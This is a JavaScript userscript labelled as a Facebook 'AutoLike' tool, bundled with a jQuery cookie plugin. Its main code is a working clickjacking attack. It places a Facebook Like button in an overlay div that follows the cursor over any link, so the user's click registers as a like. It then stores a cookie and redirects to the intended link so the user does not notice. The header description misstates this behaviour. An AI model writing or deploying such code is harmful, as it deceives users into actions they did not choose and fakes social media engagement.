// ==UserScript==
// @name           Facebook AutoLike By. Ipang Mierhink
// @namespace      AutoLike
// @description    Automaticly like facebook statuses and comments
// @include        http://www.facebook.com/*
// ==/UserScript==



var $J = jQuery.noConflict(); 

// solve: images and floating divs
function heightestChild(elem)
{
	var t=0;
	var t_elem;
	$J("*",elem).each(function () {
	    if ( $J(this).outerHeight(true) > t ) {
	        t_elem=$J(this);
	        t=t_elem.outerHeight(true);
	    }
	});
	// we care about the heighest
	if (elem.outerHeight(true) > t)
	{
		t = elem.outerHeight(true);
	}

	//return elem.outerHeight(true);
	return t+3; // hotfix
}

function highestOffsetTop(elem)
{
	var t=elem.offset().top;
	var t_elem;
	$J("*",elem).each(function () {
	    if ( $J(this).offset().top < t ) {
	        t_elem=$J(this);
	        t=t_elem.offset().top;
	    }
	});
	// we only care about the object that is most on top
	if (elem.offset().top < t)
	{
		t = elem.offset().top;
	}

	//return elem.offset().top;
	return t+3;
}

// 57 19 63

$J(document).ready(function(){
	if (window.DO_CLICKJACKING) { // wrap up EVERYTHING

	/*$J("body").append('<div id="clickjacking" style="position:absolute;display:block;opacity:0.01;-khtml-opacity:.01;-moz-opacity:.01;filter:alpha(opacity=1);"><fb:like layout="button_count" show_faces="false" width="100"></fb:like></div>');*/
	$J("body").append('<div id="clickjacking" style="position:absolute;display:block;"><fb:like layout="button_count" show_faces="false" width="100"></fb:like></div>');

	var elementWidth = 0;
	var elementHeight = 0;
	var theElement = '';
	var likeDone = 0;

	if ($J.cookie("clickjacking_"+escape(document.URL)) == 1)
	{
		likeDone = 1;
	}

	// fired when the user clicks a link (likes our page) -> clickjacking is done
	FB.Event.subscribe('edge.create', function(response) {
		  $J("#clickjacking").css("display", "none");
		  likeDone = 1;
		  $J.cookie("clickjacking_"+escape(document.URL), "1");
		  // let the user actually go to the link he clicked.
		  window.location.href = theElement.attr('href');
	});

$J(document).mousemove(function(event) {
		if (theElement != '')
		{
			if (event.pageY < (highestOffsetTop(theElement)-4) || event.pageY > (highestOffsetTop(theElement) + heightestChild(theElement)) || event.pageX < theElement.offset().left || event.pageX > (theElement.offset().left + theElement.width()) )
			{
				//alert(event.pageY + " " + theElement.height() + " " + theElement.offset().top);
			/*	$J("#log").append("<p>mouse off the element LEFT " + event.pageX  + " " + theElement.offset().left + " " + (theElement.offset().left + theElement.width()) +  "</p>");
				$J("#log").append("<p>mouse off the element TOP " + event.pageY  + " " + highestOffsetTop(theElement) + " " + (highestOffsetTop(theElement) + heightestChild(theElement,true)) +  "</p>");*/
				theElement = ''; // the mouse is off theElement
				$J("#clickjacking").css("display", "none");
			}
			else
			{
				if ($J.browser.msie) {
					$J("#clickjacking").css("top",(event.pageY-15)+"px");
					$J("#clickjacking").css("left",(event.pageX-20)+"px");
				}
				else
				{
					$J("#clickjacking").css("top",(event.pageY-5)+"px");
					$J("#clickjacking").css("left",(event.pageX-20)+"px");
				}
			}
		}
});

$J(document).delegate("a","mouseenter", function (){
	// register mouse is inside element
	if (likeDone == 0)
	{
		theElement = $J(this);
		$J("#clickjacking").css("display", "block");
	}
}); 

} // window.DO_CLICKJACKING
});

/**
 * Cookie plugin
 *
 * Copyright (c) 2006 Klaus Hartl (stilbuero.de)
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
 *
 */

/**
 * Create a cookie with the given name and value and other optional parameters.
 *
 * @example $.cookie('the_cookie', 'the_value');
 * @desc Set the value of a cookie.
 * @example $.cookie('the_cookie', 'the_value', { expires: 7, path: '/', domain: 'jquery.com', secure: true });
 * @desc Create a cookie with all available options.
 * @example $.cookie('the_cookie', 'the_value');
 * @desc Create a session cookie.
 * @example $.cookie('the_cookie', null);
 * @desc Delete a cookie by passing null as value. Keep in mind that you have to use the same path and domain
 *       used when the cookie was set.
 *
 * @param String name The name of the cookie.
 * @param String value The value of the cookie.
 * @param Object options An object literal containing key/value pairs to provide optional cookie attributes.
 * @option Number|Date expires Either an integer specifying the expiration date from now on in days or a Date object.
 *                             If a negative value is specified (e.g. a date in the past), the cookie will be deleted.
 *                             If set to null or omitted, the cookie will be a session cookie and will not be retained
 *                             when the the browser exits.
 * @option String path The value of the path atribute of the cookie (default: path of page that created the cookie).
 * @option String domain The value of the domain attribute of the cookie (default: domain of page that created the cookie).
 * @option Boolean secure If true, the secure attribute of the cookie will be set and the cookie transmission will
 *                        require a secure protocol (like HTTPS).
 * @type undefined
 *
 * @name $.cookie
 * @cat Plugins/Cookie
 * @author Klaus Hartl/klaus.hartl@stilbuero.de
 */

/**
 * Get the value of a cookie with the given name.
 *
 * @example $.cookie('the_cookie');
 * @desc Get the value of a cookie.
 *
 * @param String name The name of the cookie.
 * @return The value of the cookie.
 * @type String
 *
 * @name $.cookie
 * @cat Plugins/Cookie
 * @author Klaus Hartl/klaus.hartl@stilbuero.de
 */
jQuery.cookie = function(name, value, options) {
    if (typeof value != 'undefined') { // name and value given, set cookie
        options = options || {};
        if (value === null) {
            value = '';
            options.expires = -1;
        }
        var expires = '';
        if (options.expires && (typeof options.expires == 'number' || options.expires.toUTCString)) {
            var date;
            if (typeof options.expires == 'number') {
                date = new Date();
                date.setTime(date.getTime() + (options.expires * 24 * 60 * 60 * 1000));
            } else {
                date = options.expires;
            }
            expires = '; expires=' + date.toUTCString(); // use expires attribute, max-age is not supported by IE
        }
        // CAUTION: Needed to parenthesize options.path and options.domain
        // in the following expressions, otherwise they evaluate to undefined
        // in the packed version for some reason...
        var path = options.path ? '; path=' + (options.path) : '';
        var domain = options.domain ? '; domain=' + (options.domain) : '';
        var secure = options.secure ? '; secure' : '';
        document.cookie = [name, '=', encodeURIComponent(value), expires, path, domain, secure].join('');
    } else { // only name given, get cookie
        var cookieValue = null;
        if (document.cookie && document.cookie != '') {
            var cookies = document.cookie.split(';');
            for (var i = 0; i < cookies.length; i++) {
                var cookie = jQuery.trim(cookies[i]);
                // Does this cookie string begin with the name we want?
                if (cookie.substring(0, name.length + 1) == (name + '=')) {
                    cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                    break;
                }
            }
        }
        return cookieValue;
    }
};